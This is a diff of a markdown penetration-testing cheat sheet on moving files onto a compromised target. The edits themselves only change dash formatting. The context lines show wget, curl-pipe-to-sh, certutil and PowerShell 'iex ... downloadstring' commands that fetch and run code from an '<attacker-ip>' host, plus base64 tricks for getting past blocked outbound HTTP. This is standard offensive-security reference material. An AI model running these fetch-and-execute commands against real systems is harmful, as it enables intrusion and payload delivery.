@@ -1,4 +1,4 @@
-
+﻿
 # File Transfers
 
 ---
@@ -12,7 +12,7 @@ python3 -m http.server 80
 
 ---
 
-## Linux — Download to Target
+## Linux  -  Download to Target
 
 ```bash
 # wget
@@ -25,23 +25,23 @@ curl http://<attacker-ip>/file.sh -o file.sh
 curl http://<attacker-ip>/file.sh | sh
 ```
 
-**SCP** — requires SSH credentials on target
+**SCP**  -  requires SSH credentials on target
 ```bash
 scp file.sh user@<target>:/tmp/file.sh
 ```
 
-**Base64** — useful when outbound HTTP is blocked
+**Base64**  -  useful when outbound HTTP is blocked
 ```bash
-# On attacker — encode
+# On attacker  -  encode
 base64 file -w 0
 
-# On target — decode
+# On target  -  decode
 echo "<base64string>" | base64 -d > file
 ```
 
 ---
 
-## Windows — Download to Target
+## Windows  -  Download to Target
 
 ```powershell
 # PowerShell - Invoke-WebRequest
@@ -54,12 +54,12 @@ certutil -urlcache -split -f http://<attacker-ip>/file.exe file.exe
 iex(new-object net.webclient).downloadstring('http://<attacker-ip>/file.ps1')
 ```
 
-**Base64** — useful when outbound HTTP is blocked
+**Base64**  -  useful when outbound HTTP is blocked
 ```powershell
-# On attacker — encode
+# On attacker  -  encode
 base64 file -w 0
 
-# On target — decode and write
+# On target  -  decode and write
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<base64string>")) | Set-Content file.exe
 ```
 
